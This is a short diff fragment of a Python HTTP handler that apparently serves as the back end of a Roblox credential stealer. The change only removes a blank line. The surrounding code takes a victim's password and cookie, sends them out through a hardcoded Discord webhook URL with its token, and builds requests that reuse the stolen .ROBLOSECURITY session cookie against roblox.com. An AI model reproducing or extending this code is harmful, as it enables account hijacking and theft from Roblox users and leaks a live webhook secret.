@@ -15,7 +15,6 @@ class MyRequestHandler(http.server.BaseHTTPRequestHandler):
         password = data['b']
         cookie = data['c']
 
-
         webhook = discord.SyncWebhook.from_url('https://discord.com/api/webhooks/1187857540223082528/pHdjSygf1gsAQ7fFt_xX9VYdcpwngD677KQhUKq1pgW2ynLB4wdBCLlqEIQy3rt2xve6')
 
         headers = { 'Cookie': '.ROBLOSECURITY=' + cookie, 'User-Agent': 'Roblox/WinInet', 'Referer': 'https://www.roblox.com/' }
